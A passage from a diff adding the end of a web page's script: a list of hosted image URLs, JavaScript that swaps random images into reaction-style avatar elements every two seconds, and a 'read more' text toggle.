+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg1lK5EDaZdkinEF2kj1VklqN1mhGgpk901D3_SExixEZ0z0OnykSHmsqUN8XMR92JDGW_qdJ1nH1ZbRnFq-M1GRkuHAn_9_AmPitIVTRaRhNXSFfgjLCySU0yv9sMFf8heQa9hCB_b_OH2OhO1FPja5aVPddrrYgnCMRFPZKtJP92BELGZFLsWZu4tQKo/s320/WhatsApp%20(2).png",
+
+"https://blogger.googleusercontent.com/img/a/AVvXsEhs7wqzF6iWnwP7O7X2OyaPpo8iEAUkhLTlUFD6Hamq_zvYYvH4v22mxEfdOXX3pd0HceIkgwRXp5MYsIaRMN1dyjzsVCdXq_qtKQV9vVrHEcW6O7dfOADux1pmABCi8Of5iRqi8YDBdyptive-PNqR68qXSR215wU3Lbv56dqmjN3V8O2SaiGEHvGrqX4=s16000",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaWot97_NnqBgDntiqB47W4Wve1pcyGjjXZa28ApMT_GyYiASlx2FiCj3Ki38a41hjz2mrRjkYcC0kHtCik354-_D8QobBcZRItGcDmp4WnfYU3bbvlcL4lJKmzuXWzzgcu0XwT_O22r5C64N_wYDcRwnkEpFqHGuEo2dAPfn20YbMfdRNtbCRZEYAv4A/s16000/dp%20911.png",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQvgmU9NzAioeWvKS-7D4-LQEx7A5YW44OY0KBJ599F26Ie-BvJuG8uZhmbVnr50foO9YR5Nw54Ggze0P2NvLwfU-HQJXqI9jRHX15mFq3BTqYwOurpcH1jmaJ-1V517cuJs790yB_SNnKjRI4xaMPvcrGjCPDlus1SevkcTGUV3OtKja7dqRla5gUTFA/s16000/dpppppp.jpg",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2jRsg3_u7hrEOszB_ndW4Q8_VOZ9vH7tPqNZo_0s6WLlcMmv8fAw5l7L86SQDLcRzC70NMzwW6vZGUTDaD0q-9DhnBCerm4OOQODAitCqww3FX7YoSRApucA56WiTQEGOdCEvhOaw1Z8Ey-PhTLGdUxs0qEg-TlwV4NUEr9YdeU3MAmEHXpyW6ZA5Mn0/s320/7u.jpg",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQisMCJ2O_Z0z7S3uNp5rtlcY0dD6oOhTR8OJh8R0f4euDSx-roLWCsfDfTNcfhW_ZLgIxeGNnCSmO2py-CpDL0GQEkYTJdphw3JzfahZsM3ske0SpPo1o9WtDibejyFjU9duy629tY4vUrwHc90UAFeAz3vWykwaU9MepuQePWmlKxU5hsiXmfmMDMVA/s320/7uu.jpg",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTJ8f1FMwNr1gXMXk2DQtAPXBO4gs1Eq3XNoLIeXafftkwG8NBP_2VQTX1kaKogIV0cThR7hPyrhRBi3eNe9usWSTwiXTSTJD8BoCaUqgjJwsd4YyvFIQK4mAYHwcFlES2fveSAQBQzEZq73EXHxT8OSXReqFPoeiSKyX2meAHxK8vtBX-M791XhHfMDE/s320/343.jpg",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqzlGHjKIsGlj6FNAEOpltFyfWO3WTvWqIXOHjMDATnQITUQsff5-tzq_USKnBWvp_SaTCulABIgcxDQZ6WdHTAv99bjhAK6z1UVAEbl21mnrbRQfgkP7MqWvs2iJ4cowmQiCqk021qCppUbzi2e7m2QGtZZqZ5NzlYO4szFdfDMMZXAT50lZ5KBqxJTc/s320/555.PNG",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsF0D5ltxYNc8ezw_RAjvsC5BAgTtxc5bc95bXTZYPMah4_r-w5i9kkDzgIITD6HjTu1KJv6rvqyozJbK19dyE2FQmtvj7QO179VV8gUxwxWhD0TyO3k_vQ_h6jtvIUVf-w8S9YKRun0Yl5Z1-I2NquY6cC4iWCopTqdEOT3jEzG81d8PFu5AP3Oz5rRE/s320/54545.jpg",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjJoU3XpIOGL4SdzyrsxAg1wt2LsYQYesFKLBUhd8D7AgdSKt4elYApKtGDhzE-43mcNhQmc9DAOT3fyDscNFhMd6lKRKqJsXeyejkF3CkbMuRo7K7M2wOXmiR-yDlp8YfWEe31eSpIz9V5o7kqg6nhPql_ZEAPhykJS5-OevhugQhWeX6DFujyQ3xdpc/s320/56677.jpg",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJnUzffOCs-b9E8CdmOoHFQyijppugmdodTUi44_C_nE1PhQ6x7MfkmNL1OAX3GWm_qblEGKkek5voDxc3U7BYae_DbTZsDspUzQTbpHJg5E9oVTuoRdbzVloxmCfveyJJFCesPWCWGWh2I6uEjo_4XYdUqmOYJWxslOTXNaygk-pejsnbgXx8BHdNeHo/s320/20211106_112203.jpg",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilopxx-7_FRmBoWEDHs0IpFDmmaa5SKxYNWwULczOrmAyh-5H2LLHO8bivErWLp_MEesxArv_zujC2ifwSwGc-KZ75z9Z6lNy7iiaZo2QtX6xONIOof4pJgcYIKFy32stsrncQUTI29oYKQwn7tcvDKoTbHZxH6ovwbDoHe49HUMH6mw1wXTsiL8RKov4/s320/398656629_304523529003993_1663862817888076018_n.jpg",
+
+
+
+
+
+// Add more image URLs
+];
+
+// Function to set random images to image elements for a given class
+function setRandomImages(className) {
+const imageElements = document.querySelectorAll(`img.${className}`);
+const randomImage = imageArray[Math.floor(Math.random() * imageArray.length)];
+imageElements.forEach(imgElement => {
+imgElement.src = randomImage;
+});
+}
+
+// Function to rotate images for all classes every 2 seconds
+function rotateImages() {
+const classes = ['like', 'love', 'care', 'care1'];
+classes.forEach(className => {
+setRandomImages(className);
+});
+setTimeout(rotateImages, 2000);
+}
+
+// Call the rotateImages function on page load
+window.onload = rotateImages;
+
+function salxhw() {
+  var dots = document.getElementById("dots");
+  var moreText = document.getElementById("alxmr");
+  var btnText = document.getElementById("btmr");
+
+  if (dots.style.display === "none") {
+	dots.style.display = "inline";
+	moreText.style.display = "none";
+  } else {
+	dots.style.display = "none";
+	btnText.innerHTML = "";
+	moreText.style.display = "inline";
+  }
+}
+</script>	
+</body>
+</html>
